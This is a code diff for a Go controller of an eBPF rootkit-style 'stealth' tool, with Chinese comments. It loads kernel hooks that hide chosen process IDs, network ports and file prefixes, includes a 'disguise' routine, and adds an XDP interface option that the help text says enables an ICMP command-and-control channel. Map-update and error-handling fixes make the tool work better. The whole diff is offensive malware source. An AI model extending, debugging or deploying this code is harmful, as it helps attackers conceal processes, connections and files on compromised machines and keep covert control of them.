@@ -47,6 +47,7 @@ type stealth struct {
 	obj     *ebpf.Collection // 已加载的 eBPF 对象（包含所有 map 和程序）
 	links   []link.Link      // 已挂载的 hook，退出时逐一 Close() 卸载
 	bpfPath string           // .bpf.o 文件路径
+	iface   string           // XDP 挂载网卡名（可选，不指定则跳过 XDP hook）
 
 	// 本地缓存，用于 show 命令展示
 	pids     []uint32
@@ -61,6 +62,7 @@ func newStealth(path string) *stealth {
 func (s *stealth) loaded() bool { return s.obj != nil }
 
 // load 打开并加载 .bpf.o，挂载所有 hook，写入初始开关
+// loadWithIface 可以指定 XDP 挂载网卡
 func (s *stealth) load() error {
 	if s.loaded() {
 		return fmt.Errorf("已加载，请先 unload")
@@ -91,7 +93,7 @@ func (s *stealth) load() error {
 		if !ok {
 			continue
 		}
-		lk, err := attachBySpec(prog, sec)
+		lk, err := attachBySpec(prog, sec, s.iface)
 		if err != nil {
 			fmt.Printf("  [warn] 挂载 %s (%s) 失败: %v\n", name, sec, err)
 			continue
@@ -155,8 +157,8 @@ func (s *stealth) hidePID(pid uint32) error {
 		return fmt.Errorf("map hidden_pids 不存在")
 	}
 	var v uint8 = 1
-	if err := m.Update(pid, v, ebpf.UpdateAny); err != nil {
-		return err
+	if err := m.Update(pid, &v, ebpf.UpdateAny); err != nil {
+		return fmt.Errorf("update hidden_pids key=%d: %w", pid, err)
 	}
 	s.pids = append(s.pids, pid)
 	return nil
@@ -171,8 +173,8 @@ func (s *stealth) hidePort(port uint16) error {
 		return fmt.Errorf("map hidden_ports 不存在")
 	}
 	var v uint8 = 1
-	if err := m.Update(port, v, ebpf.UpdateAny); err != nil {
-		return err
+	if err := m.Update(port, &v, ebpf.UpdateAny); err != nil {
+		return fmt.Errorf("update hidden_ports key=%d: %w", port, err)
 	}
 	s.ports = append(s.ports, port)
 	return nil
@@ -188,7 +190,7 @@ func (s *stealth) hideFile(prefix string) error {
 	}
 	h := hashPrefix(prefix)
 	var v uint8 = 1
-	if err := m.Update(h, v, ebpf.UpdateAny); err != nil {
+	if err := m.Update(h, &v, ebpf.UpdateAny); err != nil {
 		return err
 	}
 	s.prefixes = append(s.prefixes, prefix)
@@ -233,7 +235,7 @@ func disguise() {
 func printHelp() {
 	fmt.Print(`
 命令列表:
-  load                  加载并挂载 eBPF 程序
+  load [path] [--iface <网卡>]  加载并挂载 eBPF 程序，--iface 指定 XDP 挂载网卡（启用 ICMP C2）
   unload                卸载所有 hook
   enable                开启隐藏功能
   disable               关闭隐藏功能（保留 hook，不卸载）
@@ -283,8 +285,14 @@ func main() {
 		var err error
 		switch cmd {
 		case "load":
-			if len(parts) > 1 {
-				s.bpfPath = parts[1]
+			// 用法: load [path] [--iface <网卡>]
+			for i := 1; i < len(parts); i++ {
+				if parts[i] == "--iface" && i+1 < len(parts) {
+					s.iface = parts[i+1]
+					i++
+				} else {
+					s.bpfPath = parts[i]
+				}
 			}
 			err = s.load()
 			if err == nil {
